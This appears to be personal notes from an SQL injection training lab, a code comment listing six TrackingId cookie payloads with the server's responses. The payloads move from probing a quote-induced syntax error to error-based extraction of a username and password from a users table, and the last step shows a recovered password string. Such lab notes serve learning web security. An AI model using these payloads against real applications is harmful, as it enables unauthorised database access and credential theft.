/*

1) Cookie: TrackingId='; 
//Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '''
//revealed query

2) Cookie: TrackingId='--;
//no error

3) Cookie: TrackingId=' AND CAST((SELECT 1) AS INT)--;
// Error :must be a boolean expression and not INT.

4) Cookie: TrackingId=' AND 1=CAST((SELECT 1) AS INT)--;
//no error

5) Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users limit 1)AS INT)--

6) Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users limit 1) AS INT)--
idj2lklyk4diev29v2hp
*/